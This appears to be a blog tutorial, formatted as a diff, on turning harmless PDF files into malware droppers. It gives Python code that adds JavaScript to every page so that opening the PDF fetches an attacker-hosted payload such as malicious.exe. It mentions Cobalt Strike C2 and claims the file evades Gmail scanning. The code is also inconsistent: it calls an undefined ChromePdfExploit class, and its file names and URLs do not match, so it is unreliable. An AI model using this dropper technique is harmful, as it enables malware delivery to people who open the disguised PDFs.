@@ -1,0 +1,119 @@
+Injecting Malicious Code into PDF Files and PDF Dropper Creation
+July 25, 2024 17:30:12
+Injecting Malicious Code into PDF Files and Creating a PDF Dropper
+Introduction
+PDF files are often considered static documents by most people. However, the PDF standard allows for the execution of JavaScript code within the document. This feature offers various attack vectors that can be used for Red Team tests and cybersecurity research. In this article, we will examine how to inject JavaScript into a PDF file to download a file from a specific URL and establish a Command and Control (C2) connection using this method.
+
+Tools and Methods to Be Used
+In this article, we will use the following tools to inject malicious code and create a PDF dropper:
+
+Python: To create and manipulate PDF files.
+fpdf2 Library: To add JavaScript to PDF files.
+Cobalt Strike Payload for C2 Connection: To establish a connection. You can use another C2 or RAT if you prefer.
+Adding JavaScript to PDF Files
+JavaScript can be used for various purposes within PDF files. However, the capabilities of JavaScript in PDF files are more limited compared to JavaScript in HTML and web pages. Browsers and PDF viewers restrict the access area of JavaScript within PDFs for security reasons. Nevertheless, we can perform certain operations within these limitations.
+
+Creating a PDF Dropper
+To add malicious code to a PDF file and download a file from a specific URL, we can follow these steps:
+
+Step 1: Install Required Python Libraries
+First, we need to install the required Python libraries. The fpdf2 library is what we will use to create and manipulate PDF files.
+
+pip install fpdf2
+Step 2: Adding JavaScript Code to the PDF
+The following Python code allows you to add JavaScript to a PDF file to download a file from a specific URL.
+
+adobecodeinject.py File
+from core import *
+from core.imp import *
+
+class AdobeCodeInject():
+    def __init__(self, target_url: str) -> None:
+        self.target_url = target_url
+
+    def _make_action(self) -> DictionaryObject:
+        js_code = f"""
+try {{
+    app.launchURL('{self.target_url}', true);
+}} catch (e) {{
+    app.alert('Error: ' + e.message);
+}}
+"""
+        return DictionaryObject({
+            NameObject("/S"): NameObject("/JavaScript"),
+            NameObject("/JS"): TextStringObject(js_code),
+        })
+
+    def _make_annot(self, rect: RectangleObject, action: IndirectObject) -> DictionaryObject:
+        annot = DictionaryObject({
+            NameObject("/Type"): NameObject("/Annot"),
+            NameObject("/Subtype"): NameObject("/Widget"),
+            NameObject("/Rect"): rect,
+            NameObject("/FT"): NameObject("/Btn"),
+            NameObject("/T"): TextStringObject("Open URL"),
+            NameObject("/Ff"): NumberObject(4), 
+            NameObject("/A"): action,
+        })
+        return annot
+
+    def exploit(self, pdf: Pdf):
+        action = self._make_action()
+        for p in pdf.pages:
+            arct = p.artbox
+            if not isinstance(arct, RectangleObject):
+                arct = p.mediabox
+            if not isinstance(arct, RectangleObject):
+                arct = p.bleedbox
+            print(f"{p.page_number} use arct: {arct}")
+            annot = self._make_annot(arct, pdf.add_object(action))
+            pdf.add_annotation(p, annot)
+
+Main Script File (main.py)
+You can use the main script file as follows:
+
+#! ./.venv/bin/python3
+
+import argparse
+import sys
+import os
+
+sys.path.append(os.path.dirname(os.path.abspath(__file__)))
+
+from core import Pdf
+from adobecodeinject import AdobeCodeInject
+
+def run():
+    parser = argparse.ArgumentParser(prog='pdf-exploit')
+
+    parser.add_argument("-f", help="the harmless pdf path", required=True)
+    parser.add_argument("-p", help="password", required=False)
+    parser.add_argument("-o", help="the new pdf file", required=True)
+    
+    chrome_group = parser.add_argument_group(
+        title="chrome", description="Chrome PDF exploit using JavaScript")
+    chrome_group.add_argument("-downloadUrl", dest="downloadUrl", required=True)
+
+    args = parser.parse_args()
+
+    pdf = Pdf(args.f, args.p)
+
+    if args.downloadUrl:
+        print(f"[+] use the Chrome PDF exploit: {args.downloadUrl}")
+        exp = ChromePdfExploit(args.downloadUrl)
+        exp.exploit(pdf)
+        print("")
+
+    print(f"[+] store to {args.o}")
+    pdf.store(args.o)
+
+if __name__ == "__main__":
+    run()
+Creating and Testing the PDF File
+You can create the PDF file with this command:
+
+python main.py -f original.pdf -o exploit.pdf -downloadUrl http://yourserver/malicious.exe
+When you open the exploited.pdf file in Adobe Acrobat, it should download the file from http://localhost/test.exe when the PDF is opened. This method is particularly effective with Adobe Acrobat software.
+
+
+This method will make Gmail even scan the file as a regular PDF.
+
